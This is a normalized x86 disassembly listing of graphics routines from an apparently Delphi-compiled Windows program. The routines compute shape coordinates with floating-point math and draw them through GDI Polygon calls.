mov ecx [ ebp + 0x8 ]
lea edx [ ecx + edx * 8 - 0x31c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x214 ]
test eax eax
jle r-xdata
inc ebx
mov ecx [ ebp + 0x8 ]
mov esi [ edx ]
mov [ ecx + ebx * 8 - 0x210 ] esi
mov esi [ edx + 0x4 ]
mov [ ecx + ebx * 8 - 0x20c ] esi
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx - 0x210 ]
mov esi [ ebp + 0x8 ]
sub ecx [ esi - 0x20c ]
inc ecx
add ecx ebx
mov esi [ ebp + 0x8 ]
lea ecx [ esi + ecx * 8 - 0x210 ]
mov esi [ ebp + 0x8 ]
mov esi [ esi - 0x214 ]
add esi esi
mov edi [ ebp + 0x8 ]
sub esi [ edi - 0x210 ]
add esi ebx
mov edi [ ebp + 0x8 ]
lea edi [ edi + esi * 8 - 0x210 ]
mov esi [ edi ]
mov [ ecx ] esi
mov esi [ edi + 0x4 ]
mov [ ecx + 0x4 ] esi
add edx 0x8
dec eax
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ebx [ eax - 0x214 ]
jmp r-xdata
mov edx [ ebp + 0x8 ]
add edx 0xfffffcec
mov ecx [ ebp + 0x8 ]
lea ebx [ ecx - 0x208 ]
mov ecx [ edx ]
mov [ ebx ] ecx
mov ecx [ edx + 0x4 ]
mov [ ebx + 0x4 ] ecx
add ebx 0x8
add edx 0x8
dec eax
jne r-xdata
sub_4751cc
push ebp
mov ebp esp
add esp 0xfffffc9c
push ebx
push esi
push edi
mov [ ebp - 0x324 ] ecx
mov [ ebp - 0x320 ] edx
mov [ ebp - 0x4 ] eax
fld [ ebp + 0x10 ]
fsub [ ebp + 0x18 ]
fabs
fmul [ r-xdata ]
fld [ r-xdata ]
fdivp st1
fdiv [ r-xdata ]
call sub_402b00
mov edx eax
mov eax 0x1e
call sub_47695c
add eax 0x2
mov [ ebp - 0x214 ] eax
mov eax [ ebp - 0x324 ]
push eax
mov eax [ ebp + 0x20 ]
push eax
lea edx [ ebp - 0x31c ]
mov ecx [ ebp - 0x320 ]
mov eax [ ebp - 0x4 ]
call sub_473330
fld [ ebp + 0x10 ]
fsub [ ebp + 0x18 ]
mov eax [ ebp - 0x214 ]
dec eax
mov [ ebp - 0x364 ] eax
fild [ ebp - 0x364 ]
fdivp st1
fstp [ ebp - 0x358 ]
fwait
fld [ ebp + 0x18 ]
fstp [ ebp - 0x330 ]
fwait
mov ebx [ ebp - 0x214 ]
test ebx ebx
jle r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
call sub_41dadc
test al al
jne r-xdata
mov [ ebp - 0x35c ] 0x1
lea esi [ ebp - 0x314 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
call sub_41d9c0
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov ax [ ebp - 0x328 ]
push eax
push [ ebp - 0x32c ]
push [ ebp - 0x330 ]
lea edx [ ebp - 0x350 ]
lea eax [ ebp - 0x340 ]
call sub_4729e4
fild [ ebp + 0x2c ]
fld [ ebp - 0x350 ]
fmulp st1
call sub_402b00
mov edi eax
add edi [ ebp - 0x320 ]
fild [ ebp + 0x28 ]
fld [ ebp - 0x340 ]
fmulp st1
call sub_402b00
mov edx [ ebp - 0x324 ]
sub edx eax
mov [ ebp - 0x360 ] edx
mov eax [ ebp - 0x360 ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov edx esi
mov ecx edi
mov eax [ ebp - 0x4 ]
call sub_473330
mov eax [ ebp - 0x360 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
mov eax [ ebp - 0x214 ]
add eax eax
inc eax
sub eax [ ebp - 0x35c ]
lea edx [ ebp + eax * 8 - 0x210 ]
mov ecx edi
mov eax [ ebp - 0x4 ]
call sub_473330
fld [ ebp - 0x330 ]
fadd [ ebp - 0x358 ]
fstp [ ebp - 0x330 ]
fwait
inc [ ebp - 0x35c ]
add esi 0x8
dec ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
call sub_41dadc
test al al
jne r-xdata
mov eax [ ebp - 0x214 ]
mov eax [ ebp + eax * 8 - 0x31c ]
cmp eax [ ebp - 0x320 ]
jge r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx [ ebp - 0x8 ]
call sub_41d9c8
jmp r-xdata
mov eax [ ebp - 0x314 ]
cmp eax [ ebp - 0x320 ]
jle r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x31c ]
mov [ eax + 0xc0 ] edx
mov edx [ ebp - 0x318 ]
mov [ eax + 0xc4 ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x214 ]
mov ecx [ ebp + edx * 8 - 0x31c ]
mov [ eax + 0xc8 ] ecx
mov ecx [ ebp + edx * 8 - 0x318 ]
mov [ eax + 0xcc ] ecx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x214 ]
mov ecx [ ebp + edx * 8 - 0x208 ]
mov [ eax + 0xd0 ] ecx
mov ecx [ ebp + edx * 8 - 0x204 ]
mov [ eax + 0xd4 ] ecx
mov eax [ ebp - 0x324 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
mov eax [ ebp - 0x4 ]
lea edx [ eax + 0xd8 ]
mov ecx [ ebp - 0x320 ]
mov eax [ ebp - 0x4 ]
call sub_473330
cmp [ ebp + 0xc ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x28
inc ebx
mov [ ebp - 0x35c ] 0x2
lea eax [ ebp - 0x30c ]
mov eax [ ebp - 0x214 ]
inc eax
push eax
lea eax [ ebp - 0x31c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_41e234
push eax
call Polygon
xor edx edx
xor eax eax
mov [ ebp - 0x20c ] eax
xor eax eax
mov [ ebp - 0x210 ] eax
mov ebx [ ebp - 0x214 ]
sub ebx 0x2
jl r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x31c ]
mov [ eax + 0xc0 ] edx
mov edx [ ebp - 0x318 ]
mov [ eax + 0xc4 ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x314 ]
mov [ eax + 0xc8 ] edx
mov edx [ ebp - 0x310 ]
mov [ eax + 0xcc ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x214 ]
add edx edx
mov ecx [ ebp + edx * 8 - 0x210 ]
mov [ eax + 0xd0 ] ecx
mov ecx [ ebp + edx * 8 - 0x20c ]
mov [ eax + 0xd4 ] ecx
mov eax [ ebp - 0x324 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
mov eax [ ebp - 0x4 ]
lea edx [ eax + 0xd8 ]
mov ecx [ ebp - 0x320 ]
mov eax [ ebp - 0x4 ]
call sub_473330
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_47320c
push ebp
mov al 0x20
call sub_475048
pop ecx
inc [ ebp - 0x35c ]
add eax 0x8
dec ebx
jne r-xdata
mov eax [ ebp - 0x35c ]
dec eax
mov [ ebp - 0x20c ] eax
mov cl 0x1
mov esi [ ebp - 0x35c ]
inc esi
mov edi [ ebp - 0x214 ]
dec edi
sub edi esi
jl r-xdata
mov eax [ ebp - 0x4 ]
call sub_47320c
push ebp
mov al 0x20
call sub_475048
pop ecx
mov ecx [ eax ]
cmp ecx [ eax - 0x8 ]
jle r-xdata
test dl dl
jne r-xdata
inc edi
lea eax [ ebp + esi * 8 - 0x314 ]
test dl cl
je r-xdata
mov eax [ ebp - 0x214 ]
mov eax [ ebp + eax * 8 - 0x31c ]
mov ebx [ ebp - 0x214 ]
cmp eax [ ebp + ebx * 8 - 0x324 ]
jl r-xdata
inc esi
add eax 0x8
dec edi
jne r-xdata
mov [ ebp - 0x210 ] esi
mov dl 0x1
jmp r-xdata
mov eax [ ebp - 0x210 ]
cmp eax [ ebp - 0x214 ]
je r-xdata
push ebp
call sub_4750a0
pop ecx
mov eax [ ebp - 0x214 ]
mov [ ebp - 0x210 ] eax
mov dl 0x1
mov ebx [ eax ]
cmp ebx [ eax - 0x8 ]
jge r-xdata
mov eax [ ebp - 0x214 ]
mov eax [ ebp + eax * 8 - 0x31c ]
mov edx [ ebp - 0x214 ]
cmp eax [ ebp + edx * 8 - 0x324 ]
jle r-xdata
mov eax [ ebp - 0x214 ]
mov [ ebp - 0x210 ] eax
mov esi [ ebp - 0x214 ]
dec esi
jmp r-xdata
mov eax [ ebp + esi * 8 - 0x31c ]
cmp eax [ ebp + esi * 8 - 0x324 ]
jg r-xdata
dec esi
cmp esi 0x1
je r-xdata
cmp esi 0x1
jle r-xdata
mov [ ebp - 0x20c ] esi
push ebp
call sub_4750a0
pop ecx
jmp r-xdata
sub_47566c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov ecx [ esi ]
lea edx [ ebx + 0xc0 ]
mov eax ebx
call sub_473330
mov eax [ edi + 0x4 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov ecx [ edi ]
lea edx [ ebx + 0xc8 ]
mov eax ebx
call sub_473330
mov eax [ edi + 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ edi ]
lea edx [ ebx + 0xd0 ]
mov eax ebx
call sub_473330
mov eax [ esi + 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ esi ]
lea edx [ ebx + 0xd8 ]
mov eax ebx
call sub_473330
mov eax ebx
call sub_47320c
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_4756e4
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x10 ]
call sub_41dadc
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx ebx
call sub_4746bc
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx ebx
call sub_4746bc
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x10 ]
call sub_41d9c8
pop ebx
pop ebp
retn
sub_47573c
push ebp
mov ebp esp
add esp 0xfffffe6c
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov esi [ ebp + 0x10 ]
mov edi [ ebp + 0x14 ]
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
call sub_41dadc
test al al
jne r-xdata
mov eax [ rw-data ]
mov [ ebp + 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
call sub_41d9c0
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov [ ebp - 0x1c ] eax
add edi esi
sar edi 0x1
jns r-xdata
adc eax 0x0
mov eax esi
sub eax edi
sar eax 0x1
jns r-xdata
mov [ ebp - 0x18 ] edi
test bl bl
je r-xdata
adc edi 0x0
mov edi [ ebp + 0x18 ]
sub edi [ ebp + 0x20 ]
shr edi 0x1
mov eax [ ebp + 0x18 ]
add eax [ ebp + 0x20 ]
shr eax 0x1
mov [ ebp - 0x14 ] eax
mov ebx 0x1
lea esi [ ebp - 0x108 ]
mov edi [ ebp + 0x1c ]
sub edi [ ebp - 0xc ]
shr edi 0x1
mov eax [ ebp + 0x1c ]
add eax [ ebp - 0xc ]
shr eax 0x1
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0x18 ]
sub eax [ ebp + 0x20 ]
cdq
xor eax edx
sub eax edx
mov [ ebp - 0x10 ] eax
mov ebx 0x1
lea esi [ ebp - 0x108 ]
mov eax [ ebp - 0xc ]
mov [ esi ] eax
mov eax [ ebp + 0x1c ]
mov [ esi ] eax
jmp r-xdata
mov eax [ ebp + 0x18 ]
mov [ esi + 0x4 ] eax
mov eax [ ebp + 0x20 ]
mov [ esi + 0x4 ] eax
jmp r-xdata
mov eax ebx
sub eax 0x5
mov [ ebp - 0x18c ] eax
fild [ ebp - 0x18c ]
fld [ r-xdata ]
fmulp st1
add esp 0xfffffff4
fstp [ esp ]
fwait
lea edx [ ebp - 0x40 ]
lea eax [ ebp - 0x30 ]
call sub_4729e4
mov eax [ ebp - 0xc ]
cmp eax [ ebp + 0x1c ]
jge r-xdata
imul edi [ ebp + 0x8 ]
mov [ ebp - 0x18c ] edi
fild [ ebp - 0x18c ]
fdiv [ r-xdata ]
call sub_402b00
mov edi eax
mov eax [ ebp - 0x1c ]
imul [ ebp + 0x8 ]
mov [ ebp - 0x18c ] eax
fild [ ebp - 0x18c ]
fdiv [ r-xdata ]
call sub_402b00
mov [ ebp - 0x1c ] eax
mov eax [ ebp + 0x1c ]
sub eax [ ebp - 0xc ]
cdq
xor eax edx
sub eax edx
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x104 ]
push eax
mov eax [ ebp - 0x100 ]
push eax
mov ecx [ ebp - 0x108 ]
sub ecx [ ebp - 0x10 ]
lea edx [ ebp - 0x180 ]
mov eax [ ebp - 0x4 ]
call sub_473330
push 0xbfff
push 0xc90fdaa2
push 0x2168c235
lea edx [ ebp - 0x40 ]
lea eax [ ebp - 0x30 ]
call sub_4729e4
mov [ ebp - 0x18c ] edi
fild [ ebp - 0x18c ]
fld [ ebp - 0x30 ]
fmulp st1
call sub_402b00
add eax [ ebp - 0x14 ]
mov [ ebp - 0x104 ] eax
fild [ ebp - 0x1c ]
fld [ ebp - 0x40 ]
fmulp st1
call sub_402b00
mov edx [ ebp - 0x18 ]
sub edx eax
mov [ ebp - 0x100 ] edx
lea ecx [ ebp - 0x194 ]
lea edx [ ebp - 0x108 ]
mov eax [ ebp - 0x4 ]
call sub_4732e8
mov eax [ ebp - 0x194 ]
mov [ ebp - 0x188 ] eax
mov eax [ ebp - 0x190 ]
mov [ ebp - 0x184 ] eax
xor eax eax
mov [ ebp - 0x20 ] eax
mov ebx 0x2
lea esi [ ebp - 0xfc ]
mov [ ebp - 0x18c ] edi
fild [ ebp - 0x18c ]
fld [ ebp - 0x30 ]
fmulp st1
call sub_402b00
add eax [ ebp - 0x14 ]
mov [ esi + 0x4 ] eax
fild [ ebp - 0x1c ]
fld [ ebp - 0x40 ]
fmulp st1
call sub_402b00
mov edx [ ebp - 0x18 ]
sub edx eax
mov [ esi + 0x8 ] edx
inc ebx
add esi 0xc
cmp ebx 0x11
jne r-xdata
mov eax ebx
sub eax 0x4
mov [ ebp - 0x18c ] eax
fild [ ebp - 0x18c ]
fld [ r-xdata ]
fmulp st1
add esp 0xfffffff4
fstp [ esp ]
fwait
lea edx [ ebp - 0x40 ]
lea eax [ ebp - 0x30 ]
call sub_4729e4
mov [ ebp - 0x18c ] edi
fild [ ebp - 0x18c ]
fld [ ebp - 0x30 ]
fmulp st1
call sub_402b00
add eax [ ebp - 0x14 ]
mov [ esi ] eax
mov eax [ ebp + 0x20 ]
cmp eax [ ebp + 0x18 ]
jge r-xdata
imul edi [ ebp + 0x8 ]
mov [ ebp - 0x18c ] edi
fild [ ebp - 0x18c ]
fdiv [ r-xdata ]
call sub_402b00
mov edi eax
mov eax [ ebp - 0x1c ]
imul [ ebp + 0x8 ]
mov [ ebp - 0x18c ] eax
fild [ ebp - 0x18c ]
fdiv [ r-xdata ]
call sub_402b00
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x104 ]
add eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x100 ]
push eax
lea edx [ ebp - 0x180 ]
mov ecx [ ebp - 0x108 ]
mov eax [ ebp - 0x4 ]
call sub_473330
push 0xbfff
push 0x96cbe3f9
push 0x990e91a8
lea edx [ ebp - 0x40 ]
lea eax [ ebp - 0x30 ]
call sub_4729e4
mov [ ebp - 0x18c ] edi
fild [ ebp - 0x18c ]
fld [ ebp - 0x30 ]
fmulp st1
call sub_402b00
add eax [ ebp - 0x14 ]
mov [ ebp - 0x108 ] eax
fild [ ebp - 0x1c ]
fld [ ebp - 0x40 ]
fmulp st1
call sub_402b00
mov edx [ ebp - 0x18 ]
sub edx eax
mov [ ebp - 0x100 ] edx
lea ecx [ ebp - 0x194 ]
lea edx [ ebp - 0x108 ]
mov eax [ ebp - 0x4 ]
call sub_4732e8
mov eax [ ebp - 0x194 ]
mov [ ebp - 0x188 ] eax
mov eax [ ebp - 0x190 ]
mov [ ebp - 0x184 ] eax
xor eax eax
mov [ ebp - 0x20 ] eax
mov ebx 0x2
lea esi [ ebp - 0xfc ]
fild [ ebp - 0x1c ]
fld [ ebp - 0x40 ]
fmulp st1
call sub_402b00
mov edx [ ebp - 0x18 ]
sub edx eax
mov [ esi + 0x8 ] edx
inc ebx
add esi 0xc
cmp ebx 0x11
jne r-xdata
mov eax [ ebp - 0x170 ]
mov [ ebp - 0x188 ] eax
mov eax [ ebp - 0x16c ]
mov [ ebp - 0x184 ] eax
mov eax [ ebp - 0x178 ]
mov [ ebp - 0x180 ] eax
mov eax [ ebp - 0x174 ]
mov [ ebp - 0x17c ] eax
inc [ ebp - 0x20 ]
inc ebx
add esi 0xc
cmp ebx 0x11
jne r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov eax [ ebp - 0x170 ]
mov [ ebp - 0x188 ] eax
mov eax [ ebp - 0x16c ]
mov [ ebp - 0x184 ] eax
mov eax [ ebp - 0x178 ]
mov [ ebp - 0x180 ] eax
mov eax [ ebp - 0x174 ]
mov [ ebp - 0x17c ] eax
inc [ ebp - 0x20 ]
inc ebx
add esi 0xc
cmp ebx 0x11
jne r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov eax esi
mov [ ebp - 0x48 ] eax
mov eax [ ebp - 0x48 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp - 0x48 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp - 0x48 ]
mov ecx [ eax ]
sub ecx [ ebp - 0x10 ]
lea edx [ ebp - 0x178 ]
mov eax [ ebp - 0x4 ]
call sub_473330
mov eax ebx
sub eax 0x5
mov [ ebp - 0x18c ] eax
fild [ ebp - 0x18c ]
fld [ r-xdata ]
fmulp st1
add esp 0xfffffff4
fstp [ esp ]
fwait
lea edx [ ebp - 0x40 ]
lea eax [ ebp - 0x30 ]
call sub_4729e4
mov [ ebp - 0x18c ] edi
fild [ ebp - 0x18c ]
fld [ ebp - 0x30 ]
fmulp st1
call sub_402b00
add eax [ ebp - 0x14 ]
mov edx [ ebp - 0x48 ]
mov [ edx + 0x4 ] eax
fild [ ebp - 0x1c ]
fld [ ebp - 0x40 ]
fmulp st1
call sub_402b00
mov edx [ ebp - 0x18 ]
sub edx eax
mov eax [ ebp - 0x48 ]
mov [ eax + 0x8 ] edx
lea ecx [ ebp - 0x194 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_4732e8
mov eax [ ebp - 0x194 ]
mov [ ebp - 0x170 ] eax
mov eax [ ebp - 0x190 ]
mov [ ebp - 0x16c ] eax
mov eax [ ebp - 0x184 ]
sub eax [ ebp - 0x174 ]
add eax [ ebp - 0x17c ]
sub eax [ ebp - 0x16c ]
sets al
test al al
je r-xdata
mov ebx 0x10
lea esi [ ebp - 0x108 ]
lea edi [ ebp - 0x188 ]
push 0x4
lea eax [ ebp - 0x188 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_41e234
push eax
call Polygon
push ebp
mov al [ ebp - 0x20 ]
shl eax 0x4
call sub_4756e4
pop ecx
mov eax esi
mov [ ebp - 0x44 ] eax
mov eax [ ebp - 0x44 ]
mov eax [ eax + 0x4 ]
add eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x44 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp - 0x44 ]
mov ecx [ eax ]
lea edx [ ebp - 0x178 ]
mov eax [ ebp - 0x4 ]
call sub_473330
mov eax ebx
sub eax 0x4
mov [ ebp - 0x18c ] eax
fild [ ebp - 0x18c ]
fld [ r-xdata ]
fmulp st1
add esp 0xfffffff4
fstp [ esp ]
fwait
lea edx [ ebp - 0x40 ]
lea eax [ ebp - 0x30 ]
call sub_4729e4
mov [ ebp - 0x18c ] edi
fild [ ebp - 0x18c ]
fld [ ebp - 0x30 ]
fmulp st1
call sub_402b00
add eax [ ebp - 0x14 ]
mov edx [ ebp - 0x44 ]
mov [ edx ] eax
fild [ ebp - 0x1c ]
fld [ ebp - 0x40 ]
fmulp st1
call sub_402b00
mov edx [ ebp - 0x18 ]
sub edx eax
mov eax [ ebp - 0x44 ]
mov [ eax + 0x8 ] edx
lea ecx [ ebp - 0x194 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_4732e8
mov eax [ ebp - 0x194 ]
mov [ ebp - 0x170 ] eax
mov eax [ ebp - 0x190 ]
mov [ ebp - 0x16c ] eax
mov eax [ ebp - 0x188 ]
sub eax [ ebp - 0x178 ]
add eax [ ebp - 0x180 ]
sub eax [ ebp - 0x170 ]
sets al
test al al
je r-xdata
jmp r-xdata
push 0x4
lea eax [ ebp - 0x188 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_41e234
push eax
call Polygon
push ebp
mov al [ ebp - 0x20 ]
shl eax 0x4
call sub_4756e4
pop ecx
lea ecx [ ebp - 0x194 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_4732e8
mov eax [ ebp - 0x194 ]
mov [ edi ] eax
mov eax [ ebp - 0x190 ]
mov [ edi + 0x4 ] eax
add edi 0x8
add esi 0xc
dec ebx
jne r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
push 0x10
lea eax [ ebp - 0x188 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_41e234
push eax
call Polygon
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x1c
push ebp
mov al [ rw-data ]
call sub_4756e4
pop ecx
sub_475ddc
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x1c ]
push ebx
mov ebx [ ebp + 0x18 ]
push ebx
mov ebx [ ebp + 0x14 ]
push ebx
mov ebx [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0xc ]
push ebx
mov bl [ ebp + 0x8 ]
push ebx
push 0x64
call sub_47573c
pop ebx
pop ebp
retn 0x18
sub_475e04
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x10 ]
call sub_41dadc
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx ebx
call sub_4746bc
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx ebx
call sub_4746bc
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x10 ]
call sub_41d9c8
pop ebx
pop ebp
retn
sub_475e5c
push ebp
mov ebp esp
add esp 0xffffffb4
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x9 ] dl
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x14 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
call sub_41dadc
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
call sub_41d9c0
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp esi [ ebp + 0x18 ]
je r-xdata
cmp ebx [ ebp + 0x1c ]
je r-xdata
cmp [ ebp - 0x9 ] 0x0
je r-xdata
cmp esi [ ebp + 0x18 ]
jl r-xdata
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x10 ]
push eax
lea edx [ ebp - 0x11 ]
mov ecx esi
mov eax [ ebp - 0x4 ]
call sub_473330
push ebx
mov eax [ ebp + 0x10 ]
push eax
lea edx [ ebp - 0x19 ]
mov ecx esi
mov eax [ ebp - 0x4 ]
call sub_473330
mov eax [ ebp + 0x1c ]
add eax ebx
shr eax 0x1
push eax
mov eax [ ebp + 0x10 ]
add eax [ ebp + 0xc ]
shr eax 0x1
push eax
lea edx [ ebp - 0x31 ]
mov ecx [ ebp + 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_473330
mov eax [ ebp - 0x11 ]
mov [ ebp - 0x4c ] eax
mov eax [ ebp - 0xd ]
mov [ ebp - 0x48 ] eax
mov eax [ ebp - 0x31 ]
mov [ ebp - 0x44 ] eax
mov eax [ ebp - 0x2d ]
mov [ ebp - 0x40 ] eax
mov eax [ ebp - 0x19 ]
mov [ ebp - 0x3c ] eax
mov eax [ ebp - 0x15 ]
mov [ ebp - 0x38 ] eax
lea edx [ ebp - 0x4c ]
mov ecx 0x2
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0x88 ]
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp ebx [ ebp + 0x1c ]
jg r-xdata
push ebx
mov eax [ ebp + 0x10 ]
push eax
lea edx [ ebp - 0x11 ]
mov ecx esi
mov eax [ ebp - 0x4 ]
call sub_473330
push ebx
mov eax [ ebp + 0x10 ]
push eax
lea edx [ ebp - 0x19 ]
mov ecx [ ebp + 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_473330
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x10 ]
add eax [ ebp + 0xc ]
sar eax 0x1
jns r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x18
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0xc ]
push eax
lea edx [ ebp - 0x21 ]
mov ecx esi
mov eax [ ebp - 0x4 ]
call sub_473330
mov eax [ ebp - 0x11 ]
mov [ ebp - 0x4c ] eax
mov eax [ ebp - 0xd ]
mov [ ebp - 0x48 ] eax
mov eax [ ebp - 0x31 ]
mov [ ebp - 0x44 ] eax
mov eax [ ebp - 0x2d ]
mov [ ebp - 0x40 ] eax
mov eax [ ebp - 0x21 ]
mov [ ebp - 0x3c ] eax
mov eax [ ebp - 0x1d ]
mov [ ebp - 0x38 ] eax
lea edx [ ebp - 0x4c ]
mov ecx 0x2
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0x88 ]
push ebp
mov al [ rw-data ]
call sub_475e04
pop ecx
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push eax
mov ecx [ ebp + 0x18 ]
add ecx esi
sar ecx 0x1
jns r-xdata
adc eax 0x0
push ebx
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x1c ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x114 ]
push ebp
mov al [ rw-data ]
call sub_475e04
pop ecx
mov eax [ ebp + 0x18 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov ecx ebx
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x110 ]
jmp r-xdata
push ebp
mov al [ rw-data ]
call sub_475e04
pop ecx
lea edx [ ebp - 0x31 ]
mov eax [ ebp - 0x4 ]
call sub_473330
mov eax [ ebp - 0x11 ]
mov [ ebp - 0x4c ] eax
mov eax [ ebp - 0xd ]
mov [ ebp - 0x48 ] eax
mov eax [ ebp - 0x31 ]
mov [ ebp - 0x44 ] eax
mov eax [ ebp - 0x2d ]
mov [ ebp - 0x40 ] eax
mov eax [ ebp - 0x19 ]
mov [ ebp - 0x3c ] eax
mov eax [ ebp - 0x15 ]
mov [ ebp - 0x38 ] eax
lea edx [ ebp - 0x4c ]
mov ecx 0x2
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0x88 ]
cmp ebx [ ebp + 0x1c ]
jle r-xdata
adc ecx 0x0
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push ebx
mov eax [ ebp + 0xc ]
push eax
lea edx [ ebp - 0x21 ]
mov ecx esi
mov eax [ ebp - 0x4 ]
call sub_473330
mov eax [ ebp - 0x1d ]
cmp eax [ ebp - 0x2d ]
jge r-xdata
push ebx
mov eax [ ebp + 0xc ]
push eax
lea edx [ ebp - 0x29 ]
mov ecx [ ebp + 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_473330
mov eax [ ebp - 0x19 ]
mov [ ebp - 0x4c ] eax
mov eax [ ebp - 0x15 ]
mov [ ebp - 0x48 ] eax
mov eax [ ebp - 0x31 ]
mov [ ebp - 0x44 ] eax
mov eax [ ebp - 0x2d ]
mov [ ebp - 0x40 ] eax
mov eax [ ebp - 0x29 ]
mov [ ebp - 0x3c ] eax
